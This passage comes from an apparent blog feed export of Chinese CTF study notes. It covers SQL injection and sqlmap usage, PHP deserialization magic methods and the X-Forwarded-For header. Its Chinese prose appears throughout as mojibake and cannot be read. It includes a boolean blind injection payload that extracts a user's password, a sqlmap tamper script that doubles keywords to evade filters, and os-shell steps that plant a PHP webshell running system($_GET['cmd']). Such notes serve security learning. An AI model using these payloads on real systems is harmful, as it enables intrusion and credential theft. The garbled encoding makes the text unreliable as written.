<td><code>LIMIT N</code></td>
<td>ä»ç¬¬ä¸€æ¡å¼€å§‹ï¼Œå– N æ¡</td>
</tr>
<tr>
<td><code>LIMIT M,N</code></td>
<td>ä»ç¬¬ M+1 æ¡å¼€å§‹ï¼Œå– N æ¡</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>åœºæ™¯ç±»åˆ«</th>
<th>ç¤ºä¾‹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>æŒ‡å®šæ¡æ•°</td>
<td><code>SELECT * FROM users LIMIT 1;</code></td>
<td>åªå–ä¸€æ¡ï¼Œé€‚åˆæ³¨å…¥æµ‹è¯•</td>
</tr>
<tr>
<td>åˆ†é¡µ</td>
<td><code>LIMIT 0,10</code>, <code>LIMIT 10,10</code></td>
<td>åˆ†é¡µæŠ“å–ç”¨</td>
</tr>
<tr>
<td>æŒ‡å®šåç§»</td>
<td><code>LIMIT 999999999,1</code></td>
<td>ç›²æ³¨ä¸­å¸¸ç”¨åšå‡ºç•Œæ¢æµ‹</td>
</tr>
<tr>
<td>å¸ƒå°”ç›²æ³¨çˆ†ç ´</td>
<td><code>AND (SELECT ascii(substr(pass,1,1)) FROM users LIMIT 0,1)=97</code></td>
<td>çˆ†ç ´ç¬¬ä¸€ä¸ªç”¨æˆ·å¯†ç ç¬¬ä¸€ä½</td>
</tr>
<tr>
<td>åˆ—è¡¨çˆ†ç ´</td>
<td><code>LIMIT 0,1</code>, <code>LIMIT 1,1</code>, â€¦</td>
<td>çˆ†ç ´å¤šè¡Œæ•°æ®ç”¨å¾ªç¯ LIMIT çˆ†ç ´</td>
</tr>
</tbody></table>
<h2 id="sqlmapçš„ä½¿ç”¨"><a href="#sqlmapçš„ä½¿ç”¨" class="headerlink" title="sqlmapçš„ä½¿ç”¨:"></a>sqlmapçš„ä½¿ç”¨:</h2><h3 id="1-tamperçš„å†™æ³•"><a href="#1-tamperçš„å†™æ³•" class="headerlink" title="1.tamperçš„å†™æ³•:"></a>1.tamperçš„å†™æ³•:</h3><h4 id="1-åŸºæœ¬ç»“æ„"><a href="#1-åŸºæœ¬ç»“æ„" class="headerlink" title="1.åŸºæœ¬ç»“æ„:"></a>1.åŸºæœ¬ç»“æ„:</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="operator">!</span><span class="operator">/</span>usr<span class="operator">/</span>bin<span class="operator">/</span>env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span><br><span class="line">See the file &#x27;doc/COPYING&#x27; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums import PRIORITY</span><br><span class="line">__priority__ <span class="operator">=</span> PRIORITY.LOW # å½“å‰è„šæœ¬è°ƒç”¨ä¼˜å…ˆç­‰çº§</span><br><span class="line"></span><br><span class="line">def dependencies(): # å£°æ˜å½“å‰è„šæœ¬é€‚ç”¨<span class="operator">/</span>ä¸é€‚ç”¨çš„èŒƒå›´ï¼Œå¯ä»¥ä¸ºç©ºã€‚ <span class="comment">---ä½œä¸ºæç¤ºå†™å‡º</span></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, <span class="operator">*</span><span class="operator">*</span>kwargs): # ç”¨äºç¯¡æ”¹Payloadã€ä»¥åŠè¯·æ±‚å¤´çš„ä¸»è¦å‡½æ•°</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-PRIORITYä¼˜å…ˆçº§"><a href="#2-PRIORITYä¼˜å…ˆçº§" class="headerlink" title="2.PRIORITYä¼˜å…ˆçº§:"></a>2.PRIORITYä¼˜å…ˆçº§:</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">PRIORITYæ˜¯å®šä¹‰tamperçš„ä¼˜å…ˆçº§ï¼ŒPRIORITYæœ‰ä»¥ä¸‹å‡ ä¸ªå‚æ•°:</span><br><span class="line"></span><br><span class="line">LOWEST <span class="operator">=</span> <span class="number">-100</span></span><br><span class="line">LOWER <span class="operator">=</span> <span class="number">-50</span></span><br><span class="line">LOW <span class="operator">=</span> <span class="number">-10</span></span><br><span class="line">NORMAL <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">HIGH <span class="operator">=</span> <span class="number">10</span></span><br><span class="line">HIGHER <span class="operator">=</span> <span class="number">50</span></span><br><span class="line">HIGHEST <span class="operator">=</span> <span class="number">100</span></span><br><span class="line">å¦‚æœä½¿ç”¨è€…ä½¿ç”¨äº†å¤šä¸ªtamperï¼Œsqlmapå°±ä¼šæ ¹æ®æ¯ä¸ªtamperå®šä¹‰PRIORITYçš„å‚æ•°ç­‰çº§æ¥ä¼˜å…ˆä½¿ç”¨ç­‰çº§è¾ƒé«˜çš„tamperï¼Œå¦‚æœä½ æœ‰ä¸¤ä¸ªtamperéœ€è¦åŒæ—¶ç”¨ï¼Œéœ€è¦æ³¨æ„è¿™ä¸ªé—®é¢˜ã€‚</span><br></pre></td></tr></table></figure>

<h4 id="3-åŸºäºpayloadçš„ç»•è¿‡"><a href="#3-åŸºäºpayloadçš„ç»•è¿‡" class="headerlink" title="3.åŸºäºpayloadçš„ç»•è¿‡:"></a>3.åŸºäºpayloadçš„ç»•è¿‡:</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">def tamper(payload, <span class="operator">*</span><span class="operator">*</span>kwargs):</span><br><span class="line">    payload <span class="operator">=</span> payload.<span class="built_in">lower</span>()</span><br><span class="line">    payload <span class="operator">=</span> payload.replace(<span class="string">&#x27;select&#x27;</span>,<span class="string">&#x27;seleselectct&#x27;</span>)</span><br><span class="line">    payload <span class="operator">=</span> payload.replace(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;ununionion&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    <span class="comment">--ä»…ä¿®æ”¹payload</span></span><br></pre></td></tr></table></figure>

<h4 id="4-kwargså‚æ•°-ä¿®æ”¹è¯·æ±‚å¤´æ•°æ®"><a href="#4-kwargså‚æ•°-ä¿®æ”¹è¯·æ±‚å¤´æ•°æ®" class="headerlink" title="4.kwargså‚æ•°(ä¿®æ”¹è¯·æ±‚å¤´æ•°æ®):"></a>4.kwargså‚æ•°(ä¿®æ”¹è¯·æ±‚å¤´æ•°æ®):</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">è¿™ä¸ªå‚æ•°å¯ä»¥ä¿®æ”¹è¯·æ±‚å¤´æ•°æ®ä¸­çš„å…¶ä»–å‚æ•°ï¼Œå‰é¢çš„payloadå‚æ•°æ“ä½œåªä½“ç°åœ¨ url ä¸Š</span><br><span class="line">é€šè¿‡ kwargs å¯¹è¯·æ±‚å¤´ä¸­çš„å‚æ•°è¿›è¡Œä¿®æ”¹ï¼Œè¦å…ˆç†è§£ kwargs æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå¯èƒ½è¦å­¦ä¹ ä¸€ä¸‹ python é‡Œçš„å­—å…¸çŸ¥è¯†</span><br><span class="line">kwargs å­—å…¸ç»“æ„ä¸ºï¼š</span><br><span class="line">&#123;<span class="string">&#x27;headers&#x27;</span>: &#123;&#125;, <span class="string">&#x27;delimiter&#x27;</span>: <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;hints&#x27;</span>: &#123;&#125;&#125;</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹è¯·æ±‚å¤´ä¸­ <span class="keyword">User</span><span class="operator">-</span>Agent å‚æ•°å€¼ï¼š</span><br><span class="line">headers <span class="operator">=</span> kwargs.get(&quot;header&quot;,&#123;&#125;)</span><br><span class="line">headers[<span class="string">&#x27;User-Agent&#x27;</span>]<span class="operator">=</span>&quot;ä½ è¦æ”¹çš„å€¼&quot;</span><br></pre></td></tr></table></figure>

<h3 id="2-ä¸€äº›å¸¸ç”¨å‚æ•°"><a href="#2-ä¸€äº›å¸¸ç”¨å‚æ•°" class="headerlink" title="2.ä¸€äº›å¸¸ç”¨å‚æ•°:"></a>2.ä¸€äº›å¸¸ç”¨å‚æ•°:</h3><h4 id="1-ä¼˜åŒ–ï¼ŒåŠ å¿«é€Ÿåº¦"><a href="#1-ä¼˜åŒ–ï¼ŒåŠ å¿«é€Ÿåº¦" class="headerlink" title="1.ä¼˜åŒ–ï¼ŒåŠ å¿«é€Ÿåº¦:"></a>1.ä¼˜åŒ–ï¼ŒåŠ å¿«é€Ÿåº¦:</h4><h5 id="1-keep-alive"><a href="#1-keep-alive" class="headerlink" title="1.-keep-alive:"></a>1.-keep-alive:</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ä¿æŒé•¿è¿æ¥ï¼ŒåŠ å¿«é€Ÿåº¦</span><br></pre></td></tr></table></figure>

<h5 id="2-â€“threads"><a href="#2-â€“threads" class="headerlink" title="2.â€“threads"></a>2.â€“threads</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">å¤šçº¿ç¨‹ï¼ŒåŠ é€Ÿ</span><br></pre></td></tr></table></figure>

<h4 id="ä¸ä½¿ç”¨ç¼“å­˜ï¼ˆâ€“flush-sessionï¼‰"><a href="#ä¸ä½¿ç”¨ç¼“å­˜ï¼ˆâ€“flush-sessionï¼‰" class="headerlink" title="ä¸ä½¿ç”¨ç¼“å­˜ï¼ˆâ€“flush-sessionï¼‰:"></a>ä¸ä½¿ç”¨ç¼“å­˜ï¼ˆâ€“flush-sessionï¼‰:</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--flush-session    ä¸è®©sqlmapä½¿ç”¨ç¼“å­˜å†…å®¹</span></span><br></pre></td></tr></table></figure>

<h4 id="ä¸€é”®getshell"><a href="#ä¸€é”®getshell" class="headerlink" title="ä¸€é”®getshell:"></a>ä¸€é”®getshell:</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--os-shell    </span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>é˜¶æ®µ</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>â‘  è¯†åˆ«æ³¨å…¥ç‚¹</td>
<td>é€šè¿‡æ³¨å…¥å‚æ•°ï¼ˆå¦‚ <code>id=1</code>ï¼‰ï¼Œç¡®å®šæ³¨å…¥ç±»å‹ï¼ˆBoolean-Based &#x2F; Union &#x2F; Error-Based ç­‰ï¼‰</td>
</tr>
<tr>
<td>â‘¡ æ¢æµ‹æ•°æ®åº“ç±»å‹</td>
<td>MySQLã€PostgreSQLã€MSSQLã€Oracleï¼Œä¸åŒç±»å‹å†³å®šåç»­åˆ©ç”¨æ–¹æ³•</td>
</tr>
<tr>
<td>â‘¢ å°è¯•æ–‡ä»¶å†™å…¥</td>
<td>ç”¨ SQL è¯­å¥å†™ PHP æ–‡ä»¶åˆ° web ç›®å½•ï¼ˆå¦‚ <code>/var/www/html/</code>ï¼‰</td>
</tr>
<tr>
<td>â‘£ ä¸Šä¼  WebShell</td>
<td>å†™å…¥åŒ…å« <code>system($_GET[&#39;cmd&#39;])</code> çš„ PHP æ–‡ä»¶</td>
</tr>
<tr>
<td>â‘¤ éªŒè¯ WebShell æ˜¯å¦æˆåŠŸ</td>
<td>ç”¨ HTTP è¯·æ±‚è®¿é—® <code>webshell.php?cmd=whoami</code> æ¥åˆ¤æ–­æ˜¯å¦èƒ½æ‰§è¡Œå‘½ä»¤</td>
</tr>
<tr>
<td>â‘¥ å¯åŠ¨å‘½ä»¤æ§åˆ¶äº¤äº’</td>
<td>è‡ªåŠ¨ç”¨ URL + <code>cmd=</code> å‚æ•°åå¤æäº¤å‘½ä»¤ï¼Œå®ç° shell æ“ä½œï¼ˆä½†ä¸æ˜¯äº¤äº’å¼çœŸå® shellï¼Œæ˜¯ä¼ª shellï¼‰</td>
</tr>
</tbody></table>
<h4 id="Sqlmap-æ³¨å…¥æŠ€æœ¯å‚æ•°-â€“technique"><a href="#Sqlmap-æ³¨å…¥æŠ€æœ¯å‚æ•°-â€“technique" class="headerlink" title="Sqlmap æ³¨å…¥æŠ€æœ¯å‚æ•°(â€“technique):"></a>Sqlmap æ³¨å…¥æŠ€æœ¯å‚æ•°(â€“technique):</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--technique    </span></span><br><span class="line">Bï¼š<span class="type">Boolean</span><span class="operator">-</span>based blindï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰</span><br><span class="line">Eï¼šError<span class="operator">-</span>basedï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰</span><br><span class="line">Uï¼š<span class="keyword">Union</span> query<span class="operator">-</span>basedï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰</span><br><span class="line">Sï¼šStacked queriesï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰</span><br><span class="line">Tï¼š<span class="type">Time</span><span class="operator">-</span>based blindï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰</span><br><span class="line">Qï¼šInline queriesï¼ˆåµŒå¥—æŸ¥è¯¢æ³¨å…¥ï¼‰</span><br></pre></td></tr></table></figure>









]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ååºåˆ—åŒ–</title>
    <url>/2025/06/02/ctfshow/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="å¸¸è¯†"><a href="#å¸¸è¯†" class="headerlink" title="å¸¸è¯†:"></a>å¸¸è¯†:</h1><h2 id="1-å„ç±»é­”æœ¯æ–¹æ³•"><a href="#1-å„ç±»é­”æœ¯æ–¹æ³•" class="headerlink" title="1.å„ç±»é­”æœ¯æ–¹æ³•:"></a>1.å„ç±»é­”æœ¯æ–¹æ³•:</h2><table>
<thead>
<tr>
<th>é­”æœ¯æ–¹æ³•</th>
<th>è§¦å‘æ—¶æœº</th>
<th>å…¸å‹ç”¨é€”</th>
<th>æ”»å‡»&#x2F;åˆ©ç”¨å¸¸è§ç‚¹</th>
</tr>
</thead>
<tbody><tr>
<td><code>__construct()</code></td>
<td>å®ä¾‹åŒ–å¯¹è±¡æ—¶</td>
<td>åˆå§‹åŒ–å¯¹è±¡å±æ€§</td>
<td>ä¸€èˆ¬ä¸ç”¨äºæ”»å‡»ï¼Œä½†å¯é…åˆä¼ªç±»å®ç°æ›¿ä»£ç±»æ³¨å…¥</td>
</tr>
<tr>
<td><code>__destruct()</code></td>
<td>å¯¹è±¡é”€æ¯æ—¶ï¼ˆGC &#x2F; ç¨‹åºç»“æŸï¼‰</td>
<td>èµ„æºé‡Šæ”¾ã€æ—¥å¿—ç­‰</td>
<td>âœ…å¸¸è§ååºåˆ—åŒ–POPé“¾è§¦å‘ç‚¹ï¼Œå¯æ‰§è¡Œæ¶æ„é€»è¾‘ï¼ˆå¦‚ systemï¼‰</td>
</tr>
<tr>
<td><code>__call($method, $args)</code></td>
<td>è°ƒç”¨ä¸å­˜åœ¨çš„å¯¹è±¡æ–¹æ³•</td>
<td>åŠ¨æ€è·¯ç”±ã€ä»£ç†è°ƒç”¨</td>
<td>âœ… å¯ç»“åˆå‚æ•°æ±¡æŸ“è§¦å‘å‡½æ•°åŠ«æŒ</td>
</tr>
<tr>
<td><code>__callStatic($method, $args)</code></td>
<td>è°ƒç”¨ä¸å­˜åœ¨çš„é™æ€æ–¹æ³•</td>
<td>åŒä¸Šï¼Œé™æ€ç‰ˆ</td>
<td>âœ… æ¡†æ¶ä¸­å¸¸è¢«ç”¨ä½œç»•è¿‡ç‚¹</td>
</tr>
<tr>
<td><code>__get($name)</code></td>
<td>è¯»å–ä¸å­˜åœ¨&#x2F;ä¸å¯è§å±æ€§</td>
<td>å»¶è¿ŸåŠ è½½ã€åŠ¨æ€ä»£ç†</td>
<td>âœ… å¸¸é…åˆå±æ€§æ±¡æŸ“ç”¨äºå˜é‡å€¼åŠ«æŒ</td>
</tr>
<tr>
<td><code>__set($name, $value)</code></td>
<td>å†™å…¥ä¸å­˜åœ¨&#x2F;ä¸å¯è§å±æ€§</td>
<td>æ•°æ®ä¿æŠ¤ã€æ—¥å¿—ç­‰</td>
<td>âš ï¸ å¯ç”¨äºä¼ªé€ å±æ€§å½±å“ç¨‹åºæµ</td>
</tr>
<tr>
<td><code>__isset($name)</code></td>
<td>ä½¿ç”¨ isset() æ£€æµ‹ä¸å­˜åœ¨å±æ€§æ—¶</td>
<td>åˆ¤æ–­çŠ¶æ€</td>
<td>âš ï¸ å¯è¾…åŠ©è§¦å‘æ¡ä»¶</td>
</tr>
<tr>
<td><code>__unset($name)</code></td>
<td>ä½¿ç”¨ unset() åˆ é™¤ä¸å­˜åœ¨å±æ€§æ—¶</td>
<td>è‡ªå®šä¹‰æ¸…ç†</td>
<td>âš ï¸ è¾…åŠ©</td>
</tr>
<tr>
<td><code>__sleep()</code></td>
<td><code>serialize()</code> æ—¶è§¦å‘</td>
<td>æ§åˆ¶å“ªäº›å±æ€§è¢«åºåˆ—åŒ–</td>
<td>âœ… å¯ç²¾ç®€ payloadï¼Œç»•è¿‡å±æ€§æ£€æµ‹</td>
</tr>
<tr>
<td><code>__wakeup()</code></td>
<td><code>unserialize()</code> æ—¶è§¦å‘</td>
<td>æ¢å¤è¿æ¥ã€çŠ¶æ€</td>
<td>âœ… ååºåˆ—åŒ–åˆ©ç”¨é“¾å…¸å‹å…¥å£ç‚¹</td>
</tr>
<tr>
<td><code>__unserialize($data)</code></td>
<td>PHP 7.4+ <code>unserialize()</code> æ—¶è§¦å‘</td>
<td>æ›¿ä»£ <code>__wakeup</code></td>
<td>âœ… æ–°POPé“¾æ„é€ ç‚¹ï¼Œç²¾å‡†æ§åˆ¶ååºåˆ—åŒ–è¡Œä¸º</td>
</tr>
<tr>
<td><code>__toString()</code></td>
<td>å¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²ç”¨æ—¶</td>
<td>æ¨¡æ‹Ÿå­—ç¬¦ä¸²å¯¹è±¡</td>
<td>âœ… CTFç»•è¿‡ï¼Œå¦‚ <code>echo $obj</code> â†’ è§¦å‘å‘½ä»¤æ‰§è¡Œ</td>
</tr>
<tr>
<td><code>__invoke()</code></td>
<td>å¯¹è±¡è¢«å½“ä½œå‡½æ•°è°ƒç”¨æ—¶</td>
<td>åŒ¿åå‡½æ•°ã€æ‰§è¡Œå™¨</td>
<td>âœ… åŠ¨æ€ä»£ç æ‰§è¡Œé“¾ä¸­ä½¿ç”¨</td>
</tr>
<tr>
<td><code>__set_state($array)</code></td>
<td><code>var_export()</code> å¯¼å‡ºå† <code>eval()</code> æ¢å¤æ—¶è§¦å‘</td>
<td>é…ç½®ç±»å¯¼å‡ºå¯¼å…¥</td>
<td>âš ï¸ ä½é¢‘ä½¿ç”¨ï¼Œé™æ€ç±»æ„å»º</td>
</tr>
<tr>
<td><code>__debugInfo()</code></td>
<td><code>var_dump()</code> æ—¶è§¦å‘</td>
<td>è‡ªå®šä¹‰è°ƒè¯•è¾“å‡º</td>
<td>âš ï¸ å®‰å…¨æ€§ä½ï¼Œä½†å¯ç”¨äºä¿¡æ¯æ³„éœ²åœºæ™¯</td>
</tr>
<tr>
<td><code>__clone()</code></td>
<td>ä½¿ç”¨ <code>clone</code> å…³é”®å­—æ—¶è§¦å‘</td>
<td>æ·±å¤åˆ¶å®šåˆ¶åŒ–</td>
<td>âš ï¸ è¾…åŠ©æ„é€ é“¾ï¼Œä¸æ˜¯ä¸»æ”»ç‚¹</td>
</tr>
</tbody></table>
<h3 id="åˆ©ç”¨ä¼˜å…ˆçº§"><a href="#åˆ©ç”¨ä¼˜å…ˆçº§" class="headerlink" title="åˆ©ç”¨ä¼˜å…ˆçº§:"></a>åˆ©ç”¨ä¼˜å…ˆçº§:</h3><table>
<thead>
<tr>
<th>ä¼˜å…ˆçº§</th>
<th>é­”æœ¯æ–¹æ³•</th>
<th>åˆ©ç”¨è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>ğŸ¥‡ å¿…å¤‡</td>
<td><code>__destruct</code>, <code>__wakeup</code>, <code>__unserialize</code>, <code>__toString</code></td>
<td>å…³é”®è§¦å‘ç‚¹ï¼Œå¸¸ç”¨äºååºåˆ—åŒ–+ä»£ç æ‰§è¡Œ</td>
</tr>
<tr>
<td>ğŸ¥ˆ å¸¸ç”¨</td>
<td><code>__call</code>, <code>__get</code>, <code>__set</code>, <code>__invoke</code></td>
<td>æ§åˆ¶æµä¸­ç”¨äºä¸­è½¬è·³æ¿ï¼ŒåŠ«æŒå‚æ•°ã€åŠ¨æ€æ‰§è¡Œ</td>
</tr>
<tr>
<td>ğŸ¥‰ æ¬¡è¦</td>
<td><code>__sleep</code>, <code>__callStatic</code>, <code>__set_state</code>, <code>__clone</code></td>
<td>é…åˆä½¿ç”¨ï¼Œç²¾ç»†æ§åˆ¶é“¾æ„é€ ã€æ‰§è¡Œæµç¨‹</td>
</tr>
<tr>
<td>âš ï¸ ç½•è§</td>
<td><code>__isset</code>, <code>__unset</code>, <code>__debugInfo</code></td>
<td>è¾…åŠ©æ€§è´¨ï¼Œä¿¡æ¯æ³„éœ²æˆ–æ¡ä»¶åˆ¤æ–­ä¸­ç”¨åˆ°</td>
</tr>
</tbody></table>
<h1 id="åŸºç¡€ç”¨æ³•"><a href="#åŸºç¡€ç”¨æ³•" class="headerlink" title="åŸºç¡€ç”¨æ³•:"></a>åŸºç¡€ç”¨æ³•:</h1><h2 id="1-å“ªäº›æ˜¯å¯ä»¥è¢«ååºåˆ—åŒ–å‡ºæ¥çš„å€¼"><a href="#1-å“ªäº›æ˜¯å¯ä»¥è¢«ååºåˆ—åŒ–å‡ºæ¥çš„å€¼" class="headerlink" title="1.å“ªäº›æ˜¯å¯ä»¥è¢«ååºåˆ—åŒ–å‡ºæ¥çš„å€¼:"></a>1.å“ªäº›æ˜¯å¯ä»¥è¢«ååºåˆ—åŒ–å‡ºæ¥çš„å€¼:</h2><table>
<thead>
<tr>
<th>æ•°æ®ç±»å‹</th>
<th>å¯å¦ååºåˆ—åŒ–</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>O:</code> å¯¹è±¡</td>
<td>âœ… æ˜¯</td>
<td>èƒ½ååºåˆ—åŒ–ä¸ºç±»å¯¹è±¡ï¼Œå‰ææ˜¯ç±»å­˜åœ¨æˆ–å®ç°äº† <code>__autoload()</code> &#x2F; <code>spl_autoload_register()</code></td>
</tr>
<tr>
<td><code>a:</code> æ•°ç»„</td>
<td>âœ… æ˜¯</td>
<td>æ”¯æŒå…³è”æ•°ç»„ã€ç´¢å¼•æ•°ç»„</td>
</tr>
<tr>
<td><code>s:</code> å­—ç¬¦ä¸²</td>
<td>âœ… æ˜¯</td>
<td>æ™®é€šå­—ç¬¦ä¸²å¯ç›´æ¥è¿˜åŸ</td>
</tr>
<tr>
<td><code>i:</code> æ•´æ•°</td>
<td>âœ… æ˜¯</td>
<td>ä¼šè½¬å› PHP ä¸­çš„æ•´æ•°ç±»å‹</td>
</tr>
<tr>
<td><code>d:</code> æµ®ç‚¹æ•°</td>
<td>âœ… æ˜¯</td>
<td>ä¼šè¢«è¿˜åŸä¸º float ç±»å‹</td>
</tr>
<tr>
<td><code>b:</code> å¸ƒå°”å€¼</td>
<td>âœ… æ˜¯</td>
<td><code>b:0;</code> ä¸º falseï¼Œ<code>b:1;</code> ä¸º true</td>
</tr>
<tr>
<td><code>N;</code> null</td>
<td>âœ… æ˜¯</td>
<td>è¢«è¿˜åŸä¸º <code>NULL</code></td>
</tr>
<tr>
<td><code>r:</code> &amp; <code>R:</code> å¼•ç”¨</td>
<td>âœ… æ˜¯</td>
<td>ç”¨äºåŒä¸€å˜é‡å¤šæ¬¡å¼•ç”¨ï¼Œç‰¹æ®Šæƒ…å†µä½¿ç”¨ï¼Œè¾ƒå°‘è§</td>
</tr>
<tr>
<td><code>C:</code> è‡ªå®šä¹‰åºåˆ—åŒ–å¯¹è±¡</td>
<td>âœ… æ˜¯</td>
<td>éœ€è¦ç±»å®ç°äº† <code>Serializable</code> æ¥å£</td>
</tr>
<tr>
<td><code>E:</code> å¼‚å¸¸å¯¹è±¡</td>
<td>â›” å¦</td>
<td><code>Exception</code> ç­‰æ— æ³•åºåˆ—åŒ–ä¼ é€’å†æ¢å¤æˆå¯ç”¨å¼‚å¸¸å¯¹è±¡</td>
</tr>
<tr>
<td>èµ„æºç±»å‹</td>
<td>â›” å¦</td>
<td>å¦‚æ–‡ä»¶å¥æŸ„ç­‰ï¼Œ<code>fopen()</code> çš„ç»“æœä¸å¯åºåˆ—åŒ–</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>æ¼æ´ç‚¹</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>ç±»å­˜åœ¨ä½†æœªæ­£ç¡®é™åˆ¶ <code>__wakeup()</code>ã€<code>__destruct()</code>ã€<code>__toString()</code>ã€<code>__call()</code> ç­‰é­”æœ¯æ–¹æ³•</td>
<td>å¯èƒ½é€ æˆ<strong>å‘½ä»¤æ‰§è¡Œã€æ–‡ä»¶æ“ä½œã€SQLæ³¨å…¥ç­‰åˆ©ç”¨</strong></td>
</tr>
<tr>
<td>å­˜åœ¨ <code>Serializable</code> æ¥å£ä½†å¤„ç†ä¸ä¸¥è°¨</td>
<td>å¯æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ä¸­çš„å†…å®¹ï¼Œä¼ªé€ å†…éƒ¨é€»è¾‘</td>
</tr>
<tr>
<td>å­˜åœ¨ <code>__autoload</code> æˆ–è‡ªåŠ¨åŠ è½½æœºåˆ¶</td>
<td>å¯é€šè¿‡æ„é€ ç±»åé…åˆ phar åŒ…ç­‰æŠ€å·§ï¼Œå®ç°è¿œç¨‹åŠ è½½</td>
</tr>
<tr>
<td>ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è§¦å‘æ•°æ®åº“ã€æ–‡ä»¶ã€ç³»ç»Ÿå‡½æ•°</td>
<td>å¯é€ æˆ <strong>POPé“¾</strong>ï¼ˆProperty-Oriented Programmingï¼‰æ”»å‡»</td>
</tr>
</tbody></table>
<h2 id="2-X-Forwarded-Forè¯·æ±‚å¤´ï¼š"><a href="#2-X-Forwarded-Forè¯·æ±‚å¤´ï¼š" class="headerlink" title="2.X-Forwarded-Forè¯·æ±‚å¤´ï¼š"></a>2.X-Forwarded-Forè¯·æ±‚å¤´ï¼š</h2><p><strong>ä¸å±äºæŸä¸ªç¼–ç¨‹è¯­è¨€ç‰¹æœ‰çš„å¤´éƒ¨</strong>ï¼Œå®ƒæ˜¯ä¸€ä¸ª <strong>HTTPåè®®å±‚çš„è¯·æ±‚å¤´ï¼ˆHeaderï¼‰</strong>ï¼Œ<strong>ä¸è¯­è¨€æ— å…³</strong></p>
<table>
<thead>
<tr>
<th>è¯­è¨€&#x2F;æ¡†æ¶</th>
<th>ä½¿ç”¨æ–¹å¼</th>
<th>è·å–çœŸå® IP çš„æ–¹æ³•</th>
</tr>
</thead>
<tbody><tr>
<td><strong>PHP</strong></td>
<td><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code></td>
<td>æˆ–æ­é… <code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code> ä½¿ç”¨</td>
</tr>
<tr>
<td><strong>Pythonï¼ˆFlask&#x2F;Djangoï¼‰</strong></td>
<td><code>request.headers.get(&#39;X-Forwarded-For&#39;)</code></td>
<td>é»˜è®¤ <code>request.remote_addr</code> æ˜¯ä»£ç†åœ°å€</td>
</tr>
<tr>
<td><strong>Node.js (Express)</strong></td>
<td><code>req.headers[&#39;x-forwarded-for&#39;]</code></td>
<td>æˆ– <code>req.ip</code>ï¼ˆéœ€è®¾ç½® <code>trust proxy</code>ï¼‰</td>
</tr>
<tr>
<td><strong>Java (Spring Boot)</strong></td>
<td><code>request.getHeader(&quot;X-Forwarded-For&quot;)</code></td>
<td>é…åˆ <code>RemoteAddrFilter</code> ä½¿ç”¨</td>
</tr>
<tr>
<td><strong>Go (Gin&#x2F;Echo)</strong></td>
<td><code>c.Request.Header.Get(&quot;X-Forwarded-For&quot;)</code></td>
<td>åŸå§‹IPè¯†åˆ«</td>
</tr>
<tr>
<td><strong>Nginx &#x2F; Apacheï¼ˆWebæœåŠ¡å™¨ï¼‰</strong></td>
<td><code>real_ip_header X-Forwarded-For;</code></td>
<td>å¯ç”¨äºæ›¿æ¢ <code>REMOTE_ADDR</code></td>
</tr>
<tr>
<td><strong>Ruby on Rails</strong></td>
<td><code>request.headers[&quot;X-Forwarded-For&quot;]</code></td>
<td>ä¹Ÿå¯ç”¨ <code>request.remote_ip</code></td>
</tr>
<tr>
<td><strong>ASP.NET</strong></td>
<td><code>Request.Headers[&quot;X-Forwarded-For&quot;]</code></td>
<td>å¸¸ç”¨äºäº‘æœåŠ¡ä¸­æ¢å¤ç”¨æˆ·IP</td>
</tr>
</tbody></table>
